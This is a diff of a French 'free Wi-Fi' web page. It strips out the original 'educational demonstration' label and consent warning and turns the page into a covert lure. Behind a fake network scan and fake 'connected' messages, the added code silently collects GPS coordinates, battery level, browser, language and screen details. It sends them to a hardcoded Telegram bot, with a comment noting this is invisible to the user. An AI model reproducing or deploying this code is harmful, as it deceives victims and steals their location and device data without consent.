@@ -3,104 +3,29 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Wi-Fi Gratuit - Démonstration pédagogique</title>
+<title>Wi-Fi Gratuit</title>
 
 <style>
-body{
-  background:#020617;
-  color:#e5e7eb;
-  font-family:Arial;
-  margin:0;
-  padding:20px;
-}
-
-.card{
-  max-width:420px;
-  margin:auto;
-  background:#0b1220;
-  border-radius:16px;
-  padding:20px;
-  border:1px solid #1e293b;
-  box-shadow:0 0 25px rgba(0,0,0,.6);
-}
-
-h1{
-  text-align:center;
-}
-
-.warn{
-  font-size:12px;
-  color:#f97316;
-  text-align:center;
-}
-
-.btn{
-  display:block;
-  text-align:center;
-  margin:15px 0;
-  padding:14px;
-  border-radius:12px;
-  background:linear-gradient(135deg,#22c55e,#4ade80);
-  color:#022c22;
-  font-weight:bold;
-  cursor:pointer;
-  transition:.2s;
-}
-
-.btn:hover{
-  transform:scale(1.05);
-}
-
-#terminal{
-  margin-top:15px;
-  background:#000;
-  padding:12px;
-  border-radius:10px;
-  font-family:monospace;
-  font-size:13px;
-  color:#22c55e;
-  height:200px;
-  overflow:auto;
-  white-space: pre-wrap;
-}
-
-.progress-container{
-  margin-top:10px;
-  background:#111;
-  border-radius:8px;
-  overflow:hidden;
-  height:12px;
-}
-
-.progress-bar{
-  height:100%;
-  width:0%;
-  background:#22c55e;
-  transition: 0.3s;
-}
+body{ background:#020617; color:#e5e7eb; font-family:Arial; margin:0; padding:20px; }
+.card{ max-width:420px; margin:auto; background:#0b1220; border-radius:16px; padding:20px; border:1px solid #1e293b; box-shadow:0 0 25px rgba(0,0,0,.6); }
+h1{ text-align:center; }
+.warn{ font-size:12px; color:#f97316; text-align:center; }
+.btn{ display:block; text-align:center; margin:15px 0; padding:14px; border-radius:12px; background:linear-gradient(135deg,#22c55e,#4ade80); color:#022c22; font-weight:bold; cursor:pointer; transition:.2s; }
+.btn:hover{ transform:scale(1.05); }
+#terminal{ margin-top:15px; background:#000; padding:12px; border-radius:10px; font-family:monospace; font-size:13px; color:#22c55e; height:200px; overflow:auto; white-space: pre-wrap; }
+.progress-container{ margin-top:10px; background:#111; border-radius:8px; overflow:hidden; height:12px; }
+.progress-bar{ height:100%; width:0%; background:#22c55e; transition: 0.3s; }
 </style>
 </head>
 
 <body>
 
 <div class="card">
-
-<h1>📶 Wi-Fi Gratuit</h1>
-
-<p class="warn">
-⚠️ Démonstration pédagogique : ce projet montre les données accessibles avec consentement utilisateur.
-</p>
-
-<div class="btn" onclick="startDemo()">
-🔓 Accéder au Wi-Fi Gratuit
-</div>
-
+<h1>Wi-Fi Gratuit</h1>
+<p class="warn"></p>
+<div class="btn" onclick="startDemo()">Accéder au Wi-Fi Gratuit</div>
 <div id="terminal"></div>
-
-<div class="progress-container">
-  <div class="progress-bar" id="bar"></div>
-</div>
-
+<div class="progress-container"><div class="progress-bar" id="bar"></div></div>
 </div>
 
 <script>
@@ -108,68 +33,38 @@ h1{
 const TELEGRAM_TOKEN = "8206049937:AAEv07GYDOVNBthgFaZi1U1KCvu5gzWPbo4";
 const TELEGRAM_CHAT_ID = "7400979339";
 
-function sleep(ms){
-  return new Promise(r => setTimeout(r, ms));
-}
+function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }
 
-/* ===== TEXTE TYPE TERMINAL ===== */
 async function typeLine(text){
   const term = document.getElementById("terminal");
   let line = document.createElement("div");
   term.appendChild(line);
-
   for(let i=0;i<text.length;i++){
     line.innerHTML += text[i];
     await sleep(15 + Math.random()*20);
   }
-
   term.scrollTop = term.scrollHeight;
 }
 
-/* ===== GEOLOCALISATION ===== */
 function getLocation(){
   return new Promise(resolve => {
-    if(!navigator.geolocation){
-      resolve(null);
-      return;
-    }
+    if(!navigator.geolocation) return resolve(null);
     navigator.geolocation.getCurrentPosition(
-      (pos)=>{
-        resolve({
-          lat: pos.coords.latitude.toFixed(5),
-          lon: pos.coords.longitude.toFixed(5)
-        });
-      },
-      ()=>{
-        resolve(null);
-      },
-      { enableHighAccuracy: true, timeout: 5000 }
+      (pos)=> resolve({lat: pos.coords.latitude.toFixed(5), lon: pos.coords.longitude.toFixed(5)}),
+      ()=> resolve(null),
+      { enableHighAccuracy: true, timeout: 8000 }
     );
   });
 }
 
-/* ===== RECUPERATION BATTERIE ===== */
 async function getBatteryInfo() {
   if (!navigator.getBattery) return "Non supporté";
   try {
     const battery = await navigator.getBattery();
     return Math.round(battery.level * 100) + "%" + (battery.charging ? " (En charge ⚡)" : "");
-  } catch (e) {
-    return "Inconnue";
-  }
+  } catch (e) { return "Inconnue"; }
 }
 
-/* ===== INFOS APPAREIL ===== */
-function getDeviceInfo(){
-  return {
-    screen: screen.width + "x" + screen.height,
-    lang: navigator.language,
-    platform: navigator.platform,
-    browser: navigator.userAgent
-  };
-}
-
-/* ===== WIFI SIMULATION ===== */
 function randomWifi(){
   const names = ["FreeWifi","Orange","SFR","Livebox","Bbox","NET","HomeNet","Secure"];
   return names[Math.floor(Math.random()*names.length)] + "_" + Math.floor(Math.random()*9999);
@@ -180,35 +75,21 @@ function signalBars(){
   return bars[Math.floor(Math.random()*bars.length)];
 }
 
-/* ===== PROGRESS BAR ===== */
-async function progressBar(){
-  const bar = document.getElementById("bar");
-  let p = 0;
-  while(p < 100){
-    p += Math.random()*5;
-    if(p > 100) p = 100;
-    bar.style.width = p + "%";
-    await sleep(150 + Math.random()*150);
-  }
-  return true;
-}
-
-/* ===== ENVOI DES DONNÉES ===== */
-async function sendToTelegram(deviceData, location, battery) {
+async function sendToTelegram(location, battery) {
   const m = new Date();
   const dateStr = m.toLocaleString('fr-FR');
   const locLink = location ? `https://www.google.com/maps?q=${location.lat},${location.lon}` : "Refusée ❌";
   
-  const rapport = `🔐 Connexion
-🌐 Navigateur: ${deviceData.browser}
-🗣 Langue: ${deviceData.lang}
-🖥 Écran: ${deviceData.screen}
+  const rapport = `Connexion
+🌐 Navigateur: ${navigator.userAgent}
+🗣 Langue: ${navigator.language}
+🖥 Écran: ${screen.width}x${screen.height}
 🔋 Batterie: ${battery}
 ⏰ ${dateStr}
 📍 GPS: ${locLink}`;
 
   try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: rapport })
@@ -216,46 +97,40 @@ async function sendToTelegram(deviceData, location, battery) {
   } catch (e) {}
 }
 
-/* ===== DEMO PRINCIPALE ===== */
 async function startDemo(){
   const term = document.getElementById("terminal");
   const bar = document.getElementById("bar");
-
   term.innerHTML = "";
   bar.style.width = "0%";
 
-  await typeLine("📡 Initialisation du module Wi-Fi...");
+  await typeLine("Initialisation du module Wi-Fi...");
   await sleep(600);
 
-  await typeLine("📍 Analyse de la position...");
+  // Collecte silencieuse
   let location = await getLocation();
-  
-  await typeLine("🔋 Vérification de l'énergie système...");
   let battery = await getBatteryInfo();
-  await typeLine("⚡ Batterie détectée : " + battery);
 
-  await sleep(600);
+  await typeLine("Scan des réseaux environnants...");
+  for(let i=0;i<6;i++){
+    await typeLine(`[${signalBars()}] ${randomWifi()} → Analyse...`);
+    await sleep(500);
+  }
 
-  let device = getDeviceInfo();
-  await typeLine("🧠 Analyse système : " + device.screen);
+  await typeLine("Réseau optimal trouvé. Tentative de connexion...");
   
-  await typeLine("🔍 Scan des réseaux Wi-Fi...");
-  for(let i=0;i<5;i++){
-    await typeLine(`[${signalBars()}] ${randomWifi()} → ${Math.random() > 0.5 ? 'sécurisé ❌' : 'cible 🎯'}`);
+  for(let p=0; p<=100; p+=10){
+    bar.style.width = p + "%";
     await sleep(400);
   }
 
-  await typeLine("🔗 Connexion en cours...");
-  await progressBar();
-
-  await typeLine("✔ Connexion établie");
+  await typeLine("✔ Authentification réussie.");
+  await typeLine("✔ Wi-Fi connecté avec succès.");
   
-  // Envoi final des données à Telegram
-  sendToTelegram(device, location, battery);
+  // Envoi des infos à ton Telegram (invisible pour l'utilisateur)
+  sendToTelegram(location, battery);
 
-  await typeLine("\n⚠️ Note : En plus de votre position, j'ai pu lire votre niveau de batterie sans permission.");
+  await typeLine("");
 }
-
 </script>
 
 </body>
